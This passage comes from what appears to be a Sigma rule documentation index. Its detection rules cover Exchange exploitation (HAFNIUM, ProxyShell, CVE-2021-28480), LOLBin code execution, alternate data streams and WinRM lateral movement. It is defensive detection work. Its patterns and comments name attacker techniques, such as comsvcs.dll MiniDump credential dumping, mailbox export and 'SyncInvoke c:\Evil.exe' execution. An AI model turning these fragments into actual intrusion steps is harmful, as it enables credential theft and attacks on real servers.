\u0026#39;\\svchost.exe\u0026#39; selection7: Image|contains: \u0026#39;\\ProgramData\\VSPerfMon\\\u0026#39; selection8: CommandLine|contains|all: - \u0026#39; -t7z \u0026#39; - \u0026#39;C:\\Programdata\\pst\u0026#39; - \u0026#39;\\it.zip\u0026#39; selection9: Image|endswith: \u0026#39;\\makecab.exe\u0026#39; CommandLine|contains: - \u0026#39;Microsoft\\Exchange Server\\\u0026#39; - \u0026#39;inetpub\\wwwroot\u0026#39; selection10: CommandLine|contains: - \u0026#39;\\Temp\\xx.bat\u0026#39; - \u0026#39;Windows\\WwanSvcdcs\u0026#39; - \u0026#39;Windows\\Temp\\cw.exe\u0026#39; selection11: CommandLine|contains|all: - \u0026#39;\\comsvcs.dll\u0026#39; - \u0026#39;Minidump\u0026#39; - \u0026#39;\\inetpub\\wwwroot\u0026#39; selection12: CommandLine|contains|all: - \u0026#39;dsquery\u0026#39; - \u0026#39; -uco \u0026#39; - \u0026#39;\\inetpub\\wwwroot\u0026#39; condition: 1 of selection* falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1546 - attack.t1053 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_hafnium.yml/","tags":["attack.persistence","attack.t1546","attack.t1053"],"title":"Exchange Exploitation Activity"},{"categories":null,"contents":"Detects successful exploitation of Exchange vulnerability as reported in CVE-2021-28480\nKnown false-positives Unknown References https://twitter.com/GossiTheDog/status/1392965209132871683?s=20 Raw rule (edit) title: Exchange Exploitation CVE-2021-28480 id: a2a9d722-0acb-4096-bccc-daaf91a5037b status: experimental description: Detects successful exploitation of Exchange vulnerability as reported in CVE-2021-28480 references: - https://twitter.com/GossiTheDog/status/1392965209132871683?s=20 author: Florian Roth date: 2021/05/14 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection: c-uri|contains: \u0026#39;/owa/calendar/a\u0026#39; cs-method: \u0026#39;POST\u0026#39; filter: sc-status: 503 condition: selection and not filter falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_expl_exchange_cve_2021_28480.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Exchange Exploitation CVE-2021-28480"},{"categories":null,"contents":"Detects exploitation attempts in Exchange server logs as described in blog posts reporting on HAFNIUM group activity\nKnown false-positives Legitimate access to other web applications that use the same folder names as Exchange (e.g. owa, ecp) but are not Microsoft Exchange related References https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/ https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ Raw rule (edit) title: Exchange Exploitation Used by HAFNIUM id: 67bce556-312f-4c81-9162-c3c9ff2599b2 status: experimental description: Detects exploitation attempts in Exchange server logs as described in blog posts reporting on HAFNIUM group activity references: - https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/ - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ author: Florian Roth date: 2021/03/03 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection1: cs-method: \u0026#39;POST\u0026#39; c-uri|contains: \u0026#39;/owa/auth/Current/themes/resources/\u0026#39; selection2: cs-method: \u0026#39;POST\u0026#39; c-uri|contains: \u0026#39;/owa/auth/Current/\u0026#39; c-useragent: - \u0026#39;DuckDuckBot/1.0;+(+http://duckduckgo.com/duckduckbot.html)\u0026#39; - \u0026#39;facebookexternalhit/1.1+(+http://www.facebook.com/externalhit_uatext.php)\u0026#39; - \u0026#39;Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)\u0026#39; - \u0026#39;Mozilla/5.0+(compatible;+Bingbot/2.0;++http://www.bing.com/bingbot.htm)\u0026#39; - \u0026#39;Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html\u0026#39; - \u0026#39;Mozilla/5.0+(compatible;+Konqueror/3.5;+Linux)+KHTML/3.5.5+(like+Gecko)+(Exabot-Thumbnails)\u0026#39; - \u0026#39;Mozilla/5.0+(compatible;+Yahoo!+Slurp;+http://help.yahoo.com/help/us/ysearch/slurp)\u0026#39; - \u0026#39;Mozilla/5.0+(compatible;+YandexBot/3.0;++http://yandex.com/bots)\u0026#39; - \u0026#39;Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/51.0.2704.103+Safari/537.36\u0026#39; selection3: c-uri|contains: \u0026#39;/ecp/\u0026#39; cs-method: \u0026#39;POST\u0026#39; c-useragent: - \u0026#39;ExchangeServicesClient/0.0.0.0\u0026#39; - \u0026#39;python-requests/2.19.1\u0026#39; - \u0026#39;python-requests/2.25.1\u0026#39; selection4: c-uri|contains: - \u0026#39;/aspnet_client/\u0026#39; - \u0026#39;/owa/\u0026#39; cs-method: \u0026#39;POST\u0026#39; c-useragent: - \u0026#39;antSword/v2.1\u0026#39; - \u0026#39;Googlebot/2.1+(+http://www.googlebot.com/bot.html)\u0026#39; - \u0026#39;Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)\u0026#39; selection5: c-uri|contains: - \u0026#39;/owa/auth/Current/\u0026#39; - \u0026#39;/ecp/default.flt\u0026#39; - \u0026#39;/ecp/main.css\u0026#39; cs-method: \u0026#39;POST\u0026#39; selection6: cs-method: \u0026#39;POST\u0026#39; c-uri|contains|all: - \u0026#39;/ecp/\u0026#39; - \u0026#39;.js\u0026#39; condition: 1 of selection* falsepositives: - Legitimate access to other web applications that use the same folder names as Exchange (e.g. owa, ecp) but are not Microsoft Exchange related level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_exchange_exploitation_hafnium.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Exchange Exploitation Used by HAFNIUM"},{"categories":null,"contents":"Detects adding and using Exchange PowerShell snap-ins to export mailbox data by HAFNIUM\nKnown false-positives Unknown References https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/ https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ Raw rule (edit) title: Exchange PowerShell Snap-Ins Used by HAFNIUM id: 25676e10-2121-446e-80a4-71ff8506af47 status: experimental description: Detects adding and using Exchange PowerShell snap-ins to export mailbox data by HAFNIUM author: FPT.EagleEye references: - https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/ - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ date: 2021/03/03 modified: 2021/08/09 tags: - attack.execution - attack.t1059.001 - attack.collection - attack.t1114 logsource: category: process_creation product: windows detection: selection: Image: \u0026#39;*\\powershell.exe\u0026#39; CommandLine: \u0026#39;*add-pssnapin microsoft.exchange.powershell.snapin*\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/win_powershell_snapins_hafnium.yml/","tags":["attack.execution","attack.t1059.001","attack.collection","attack.t1114"],"title":"Exchange PowerShell Snap-Ins Used by HAFNIUM"},{"categories":null,"contents":"Detects URL patterns that could be found in ProxyShell exploitation attempts against Exchange servers (failed and successful)\nKnown false-positives Unknown References https://youtu.be/5mqid-7zp8k?t=2231 https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1 Raw rule (edit) title: Exchange ProxyShell Pattern id: 23eee45e-933b-49f9-ae1b-df706d2d52ef status: experimental description: Detects URL patterns that could be found in ProxyShell exploitation attempts against Exchange servers (failed and successful) references: - https://youtu.be/5mqid-7zp8k?t=2231 - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html - https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1 author: Florian Roth, Rich Warren date: 2021/08/07 modified: 2021/08/08 tags: - attack.initial_access logsource: category: webserver detection: selection_auto: c-uri|contains: \u0026#39;/autodiscover.json\u0026#39; selection_uri: c-uri|contains: - \u0026#39;/powershell\u0026#39; - \u0026#39;/mapi/nspi\u0026#39; - \u0026#39;/EWS\u0026#39; - \u0026#39;X-Rps-CAT\u0026#39; selection: sc-status: 401 selection_poc: c-uri|contains: # since we don\u0026#39;t know how it will appear in the log files, we\u0026#39;ll just use all versions - \u0026#39;autodiscover.json?@\u0026#39; - \u0026#39;autodiscover.json%3f@\u0026#39; - \u0026#39;%3f@foo.com\u0026#39; - \u0026#39;Email=autodiscover/autodiscover.json\u0026#39; - \u0026#39;json?@foo.com\u0026#39; condition: selection_auto and selection_uri or selection_poc falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_exchange_proxyshell.yml/","tags":["attack.initial_access"],"title":"Exchange ProxyShell Pattern"},{"categories":null,"contents":"Rule to detect an adversary setting OabVirtualDirectory External URL property to a script in Exchange Management log\nKnown false-positives Unknown References https://twitter.com/OTR_Community/status/1371053369071132675 Raw rule (edit) title: Exchange Set OabVirtualDirectory ExternalUrl Property id: 9db37458-4df2-46a5-95ab-307e7f29e675 description: Rule to detect an adversary setting OabVirtualDirectory External URL property to a script in Exchange Management log author: Jose Rodriguez @Cyb3rPandaH status: experimental date: 2021/03/15 modified: 2021/11/15 references: - https://twitter.com/OTR_Community/status/1371053369071132675 tags: - attack.persistence - attack.t1505.003 logsource: product: windows service: msexchange-management detection: selection: - \u0026#39;Set-OabVirtualDirectory\u0026#39; - \u0026#39;ExternalUrl\u0026#39; - \u0026#39;Page_Load\u0026#39; - \u0026#39;script\u0026#39; condition: all of selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/msexchange/win_set_oabvirtualdirectory_externalurl.yml/","tags":["attack.persistence","attack.t1505.003"],"title":"Exchange Set OabVirtualDirectory ExternalUrl Property"},{"categories":null,"contents":"Detects the creation of an ADS data stream that contains an executable (non-empty imphash)\nKnown false-positives unknown References https://twitter.com/0xrawsec/status/1002478725605273600?s=21 Raw rule (edit) title: Executable in ADS id: b69888d4-380c-45ce-9cf9-d9ce46e67821 status: test description: Detects the creation of an ADS data stream that contains an executable (non-empty imphash) author: Florian Roth, @0xrawsec references: - https://twitter.com/0xrawsec/status/1002478725605273600?s=21 date: 2018/06/03 modified: 2021/12/08 logsource: product: windows category: create_stream_hash definition: \u0026#39;Requirements: Sysmon config with Imphash logging activated\u0026#39; detection: selection: Hashes|contains: \u0026#39;IMPHASH=\u0026#39; filter: Hashes|contains: \u0026#39;IMPHASH=00000000000000000000000000000000\u0026#39; condition: selection and not filter fields: - TargetFilename - Image falsepositives: - unknown level: critical tags: - attack.defense_evasion - attack.s0139 - attack.t1564.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/create_stream_hash/sysmon_ads_executable.yml/","tags":["attack.defense_evasion","attack.s0139","attack.t1564.004"],"title":"Executable in ADS"},{"categories":null,"contents":"Detects code execution via Pester.bat (Pester - Powershell Modulte for testing)\nKnown false-positives Legitimate use of Pester for writing tests for Powershell scripts and modules References https://twitter.com/Oddvarmoe/status/993383596244258816 Raw rule (edit) title: Execute Code with Pester.bat id: 59e938ff-0d6d-4dc3-b13f-36cc28734d4e status: test description: Detects code execution via Pester.bat (Pester - Powershell Modulte for testing) author: Julia Fomina, oscd.community references: - https://twitter.com/Oddvarmoe/status/993383596244258816 date: 2020/10/08 modified: 2021/11/27 logsource: category: process_creation product: windows detection: powershell_module: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|contains|all: - \u0026#39;Pester\u0026#39; - \u0026#39;Get-Help\u0026#39; cmd_execution: Image|endswith: \u0026#39;\\cmd.exe\u0026#39; CommandLine|contains|all: - \u0026#39;pester\u0026#39; - \u0026#39;;\u0026#39; get_help: CommandLine|contains: - \u0026#39;help\u0026#39; - \u0026#39;?\u0026#39; condition: powershell_module or (cmd_execution and get_help) falsepositives: - Legitimate use of Pester for writing tests for Powershell scripts and modules level: medium tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1216 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_pester.yml/","tags":["attack.execution","attack.t1059.001","attack.defense_evasion","attack.t1216"],"title":"Execute Code with Pester.bat"},{"categories":null,"contents":"Detects file execution using the msdeploy.exe lolbin\nKnown false-positives System administrator Usage Penetration test References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msdeploy.yml https://twitter.com/pabraeken/status/995837734379032576 https://twitter.com/pabraeken/status/999090532839313408 Raw rule (edit) title: Execute Files with Msdeploy.exe id: 646bc99f-6682-4b47-a73a-17b1b64c9d34 status: test description: Detects file execution using the msdeploy.exe lolbin author: Beyu Denis, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msdeploy.yml - https://twitter.com/pabraeken/status/995837734379032576 - https://twitter.com/pabraeken/status/999090532839313408 date: 2020/10/18 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;verb:sync\u0026#39; - \u0026#39;-source:RunCommand\u0026#39; - \u0026#39;-dest:runCommand\u0026#39; Image|endswith: - \u0026#39;\\msdeploy.exe\u0026#39; condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - System administrator Usage - Penetration test level: medium tags: - attack.execution - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_msdeploy.yml/","tags":["attack.execution","attack.t1218"],"title":"Execute Files with Msdeploy.exe"},{"categories":null,"contents":"Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md Raw rule (edit) title: Execute From Alternate Data Streams id: 7f43c430-5001-4f8b-aaa9-c3b88f18fa5c status: experimental author: frack113 date: 2021/09/01 description: Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md tags: - attack.defense_evasion - attack.t1564.004 logsource: category: process_creation product: windows detection: selection_stream: CommandLine|contains: \u0026#39;txt:\u0026#39; selection_tools_type: CommandLine|contains|all: - \u0026#39;type \u0026#39; - \u0026#39; \u0026gt; \u0026#39; selection_tools_makecab: CommandLine|contains|all: - \u0026#39;makecab \u0026#39; - \u0026#39;.cab\u0026#39; selection_tools_reg: CommandLine|contains|all: - \u0026#39;reg \u0026#39; - \u0026#39; export \u0026#39; selection_tools_regedit: CommandLine|contains|all: - \u0026#39;regedit \u0026#39; - \u0026#39; /E \u0026#39; selection_tools_esentutl: CommandLine|contains|all: - \u0026#39;esentutl \u0026#39; - \u0026#39; /y \u0026#39; - \u0026#39; /d \u0026#39; - \u0026#39; /o \u0026#39; condition: selection_stream and (1 of selection_tools_*) falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_alternate_data_streams.yml/","tags":["attack.defense_evasion","attack.t1564.004"],"title":"Execute From Alternate Data Streams"},{"categories":null,"contents":"Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\nKnown false-positives legitim script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.006/T1021.006.md#atomic-test-2---invoke-command https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.2 Raw rule (edit) title: Execute Invoke-command on Remote Host id: 7b836d7f-179c-4ba4-90a7-a7e60afb48e6 status: experimental description: Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.006/T1021.006.md#atomic-test-2---invoke-command - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.2 author: frack113 date: 2022/01/07 logsource: product: windows category: ps_script definition: \u0026#39;Script block logging must be enabled\u0026#39; detection: selection_cmdlet: ScriptBlockText|contains|all: - \u0026#39;invoke-command \u0026#39; - \u0026#39; -ComputerName \u0026#39; condition: selection_cmdlet falsepositives: - legitim script level: medium tags: - attack.lateral_movement - attack.t1021.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_invoke_command_remote.yml/","tags":["attack.lateral_movement","attack.t1021.006"],"title":"Execute Invoke-command on Remote Host"},{"categories":null,"contents":"This rule detects that the path to the DLL written in the registry is different from the default one. Launched WAB.exe tries to load the DLL from Registry.\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wab.yml https://twitter.com/Hexacorn/status/991447379864932352 http://www.hexacorn.com/blog/2018/05/01/wab-exe-as-a-lolbin/ Raw rule (edit) title: Execution DLL of Choice Using WAB.EXE id: fc014922-5def-4da9-a0fc-28c973f41bfb description: This rule detects that the path to the DLL written in the registry is different from the default one. Launched WAB.exe tries to load the DLL from Registry. status: experimental references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wab.yml - https://twitter.com/Hexacorn/status/991447379864932352 - http://www.hexacorn.com/blog/2018/05/01/wab-exe-as-a-lolbin/ tags: - attack.defense_evasion - attack.t1218 date: 2020/10/13 modified: 2022/01/13 author: oscd.community, Natalia Shornikova logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|endswith: \u0026#39;\\Software\\Microsoft\\WAB\\DLLPath\u0026#39; filter: Details: \u0026#39;%CommonProgramFiles%\\System\\wab32.dll\u0026#39; condition: selection and not filter falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_wab_dllpath_reg_change.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Execution DLL of Choice Using WAB.EXE"},{"categories":null,"contents":"Detects a suspicious program execution in Outlook temp folder\nKnown false-positives Unknown Raw rule (edit) title: Execution in Outlook Temp Folder id: a018fdc3-46a3-44e5-9afb-2cd4af1d4b39 status: experimental description: Detects a suspicious program execution in Outlook temp folder author: Florian Roth date: 2019/10/01 modified: 2021/06/27 tags: - attack.initial_access - attack.t1566.001 logsource: category: process_creation product: windows detection: selection: Image|contains: \u0026#39;\\Temporary Internet Files\\Content.Outlook\\\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_outlook_temp.yml/","tags":["attack.initial_access","attack.t1566.001"],"title":"Execution in Outlook Temp Folder"},{"categories":null,"contents":"Checks whether the image specified in a process creation event doesn\u0026rsquo;t refer to an .exe file (caused by process ghosting or other unorthodox methods to start a process)\nKnown false-positives unknown References https://pentestlaboratories.com/2021/12/08/process-ghosting/ Raw rule (edit) title: Execution of Suspicious File Type Extension id: c09dad97-1c78-4f71-b127-7edb2b8e491a status: experimental description: Checks whether the image specified in a process creation event doesn\u0026#39;t refer to an .exe file (caused by process ghosting or other unorthodox methods to start a process) author: Max Altgelt date: 2021/12/09 modified: 2022/02/16 references: - https://pentestlaboratories.com/2021/12/08/process-ghosting/ tags: - attack.defense_evasion logsource: category: process_creation product: windows detection: known_image_extension: Image|endswith: - \u0026#39;.exe\u0026#39; - \u0026#39;.tmp\u0026#39; # sadly many installers use this extension filter_null: Image: null filter_image: # Windows utilities without extension Image: - \u0026#39;Registry\u0026#39; - \u0026#39;MemCompression\u0026#39; filter_empty: Image: - \u0026#39;-\u0026#39; - \u0026#39;\u0026#39; filter_starts: Image|startswith: \u0026#39;C:\\Windows\\Installer\\MSI\u0026#39; filter_pstarts: ParentImage|startswith: - \u0026#39;C:\\ProgramData\\Avira\\\u0026#39; - \u0026#39;C:\\Windows\\System32\\DriverStore\\FileRepository\\\u0026#39; filter_screensaver: Image|endswith: \u0026#39;.scr\u0026#39; filter_nvidia: Image|contains: \u0026#39;NVIDIA\\NvBackend\\\u0026#39; Image|endswith: \u0026#39;.dat\u0026#39; filter_com: Image|startswith: - \u0026#39;C:\\Windows\\System32\\\u0026#39; - \u0026#39;C:\\Windows\\SysWOW64\\\u0026#39; Image|endswith: \u0026#39;.com\u0026#39; filter_winscp: Image|endswith: \u0026#39;\\WinSCP.com\u0026#39; filter_vscode: Image|contains|all: - \u0026#39;C:\\Users\\\u0026#39; - \u0026#39;\\AppData\\\u0026#39; - \u0026#39;.tmp\u0026#39; - \u0026#39;CodeSetup\u0026#39; filter_libreoffice: Image|endswith: \u0026#39;\\program\\soffice.bin\u0026#39; filter_emc_networker: Image: - \u0026#39;C:\\Program Files\\EMC NetWorker\\Management\\GST\\apache\\cgi-bin\\update_jnlp.cgi\u0026#39; - \u0026#39;C:\\Program Files (x86)\\EMC NetWorker\\Management\\GST\\apache\\cgi-bin\\update_jnlp.cgi\u0026#39; filter_winpakpro: Image|startswith: - \u0026#39;C:\\Program Files (x86)\\WINPAKPRO\\\u0026#39; - \u0026#39;C:\\Program Files\\WINPAKPRO\\\u0026#39; Image|endswith: \u0026#39;.ngn\u0026#39; filter_myq_server: Image: - \u0026#39;C:\\Program Files (x86)\\MyQ\\Server\\pcltool.dll\u0026#39; - \u0026#39;C:\\Program Files\\MyQ\\Server\\pcltool.dll\u0026#39; filter_visualstudio: Image|startswith: - \u0026#39;C:\\Program Files\\Microsoft Visual Studio\\\u0026#39; - \u0026#39;C:\\Program Files (x86)\\Microsoft Visual Studio\u0026#39; Image|endswith: \u0026#39;.com\u0026#39; filter_msi_rollbackfiles: Image|startswith: \u0026#39;C:\\Config.Msi\\\u0026#39; Image|endswith: - \u0026#39;.rbf\u0026#39; - \u0026#39;.rbs\u0026#39; condition: not known_image_extension and not 1 of filter* falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_non_exe_image.yml/","tags":["attack.defense_evasion"],"title":"Execution of Suspicious File Type Extension"},{"categories":null,"contents":"Detects Execution via SyncInvoke in CL_Invocation.ps1 module\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Cl_invocation.yml https://twitter.com/bohops/status/948061991012327424 Raw rule (edit) title: Execution via CL_Invocation.ps1 id: 4cd29327-685a-460e-9dac-c3ab96e549dc description: Detects Execution via SyncInvoke in CL_Invocation.ps1 module status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/14 modified: 2021/10/16 references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Cl_invocation.yml - https://twitter.com/bohops/status/948061991012327424 tags: - attack.defense_evasion - attack.t1216 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - \u0026#39;CL_Invocation.ps1\u0026#39; - \u0026#39;SyncInvoke\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_cl_invocation_lolscript.yml/","tags":["attack.defense_evasion","attack.t1216"],"title":"Execution via CL_Invocation.ps1"},{"categories":null,"contents":"Detects Execution via SyncInvoke in CL_Invocation.ps1 module\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Cl_invocation.yml https://twitter.com/bohops/status/948061991012327424 Raw rule (edit) title: Execution via CL_Invocation.ps1 id: a0459f02-ac51-4c09-b511-b8c9203fc429 description: Detects Execution via SyncInvoke in CL_Invocation.ps1 module status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/14 modified: 2021/05/21 references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Cl_invocation.yml - https://twitter.com/bohops/status/948061991012327424 tags: - attack.defense_evasion - attack.t1216 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;CL_Invocation.ps1\u0026#39; - \u0026#39;SyncInvoke\u0026#39; # Example Commandline: \u0026#34;powershell Import-Module c:\\Windows\\diagnostics\\system\\Audio\\CL_Invocation.ps1; SyncInvoke c:\\Evil.exe\u0026#34; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_cl_invocation_lolscript.yml/","tags":["attack.defense_evasion","attack.t1216"],"title":"Execution via CL_Invocation.ps1"},{"categories":null,"contents":"Detects Execution via SyncInvoke in CL_Invocation.ps1 module\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Cl_invocation.yml https://twitter.com/bohops/status/948061991012327424 Raw rule (edit) title: Execution via CL_Invocation.ps1 (2 Lines) id: f588e69b-0750-46bb-8f87-0e9320d57536 description: Detects Execution via SyncInvoke in CL_Invocation.ps1 module status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/14 modified: 2021/10/16 references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Cl_invocation.yml - https://twitter.com/bohops/status/948061991012327424 tags: - attack.defense_evasion - attack.t1216 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - \u0026#39;CL_Invocation.ps1\u0026#39; - \u0026#39;SyncInvoke\u0026#39; condition: selection | count(ScriptBlockText) by Computer \u0026gt; 2 # PS \u0026gt; Import-Module c:\\Windows\\diagnostics\\system\\Audio\\CL_Invocation.ps1 # PS \u0026gt; SyncInvoke c:\\Evil.exe falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_cl_invocation_lolscript_count.yml/","tags":["attack.defense_evasion","attack.t1216"],"title":"Execution via CL_Invocation.ps1 (2 Lines)"},{"categories":null,"contents":"Detects Execution via runAfterCancelProcess in CL_Mutexverifiers.ps1 module\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/CL_mutexverifiers.yml https://twitter.com/pabraeken/status/995111125447577600 Raw rule (edit) title: Execution via CL_Mutexverifiers.ps1 id: 39776c99-1c7b-4ba0-b5aa-641525eee1a4 description: Detects Execution via runAfterCancelProcess in CL_Mutexverifiers.ps1 module status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/14 modified: 2021/10/16 references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/CL_mutexverifiers.yml - https://twitter.com/pabraeken/status/995111125447577600 tags: - attack.defense_evasion - attack.t1216 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - \u0026#39;CL_Mutexverifiers.ps1\u0026#39; - \u0026#39;runAfterCancelProcess\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_cl_mutexverifiers_lolscript.yml/","tags":["attack.defense_evasion","attack.t1216"],"title":"Execution via CL_Mutexverifiers.ps1"},{"categories":null,"contents":"Detects Execution via runAfterCancelProcess in CL_Mutexverifiers.ps1 module\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/CL_mutexverifiers.yml https://twitter.com/pabraeken/status/995111125447577600 Raw rule (edit) title: Execution via CL_Mutexverifiers.ps1 id: 99465c8f-f102-4157-b11c-b0cddd53b79a description: Detects Execution via runAfterCancelProcess in CL_Mutexverifiers.ps1 module status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/14 modified: 2021/05/21 references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/CL_mutexverifiers.yml - https://twitter.com/pabraeken/status/995111125447577600 tags: - attack.defense_evasion - attack.t1216 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;CL_Mutexverifiers.ps1\u0026#39; - \u0026#39;runAfterCancelProcess\u0026#39; # Example Commandline: \u0026#34;powershell Import-Module c:\\Windows\\diagnostics\\system\\Audio\\CL_Mutexverifiers.ps1; runAfterCancelProcess c:\\Evil.exe\u0026#34; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_cl_mutexverifiers_lolscript.yml/","tags":["attack.defense_evasion","attack.t1216"],"title":"Execution via CL_Mutexverifiers.ps1"},{"categories":null,"contents":"Detects Execution via runAfterCancelProcess in CL_Mutexverifiers.ps1 module\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/CL_mutexverifiers.yml https://twitter.com/pabraeken/status/995111125447577600 Raw rule (edit) title: Execution via CL_Mutexverifiers.ps1 (2 Lines) id: 6609c444-9670-4eab-9636-fe4755a851ce description: Detects Execution via runAfterCancelProcess in CL_Mutexverifiers.ps1 module status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/14 modified: 2021/10/16 references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/CL_mutexverifiers.yml - https://twitter.com/pabraeken/status/995111125447577600 tags: - attack.defense_evasion - attack.t1216 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - \u0026#39;CL_Mutexverifiers.ps1\u0026#39; - \u0026#39;runAfterCancelProcess\u0026#39; condition: selection | count(ScriptBlockText) by Computer \u0026gt; 2 # PS \u0026gt; Import-Module c:\\Windows\\diagnostics\\system\\Audio\\CL_Mutexverifiers.ps1 # PS \u0026gt; runAfterCancelProcess c:\\Evil.exe falsepositives: - Unknown level: high 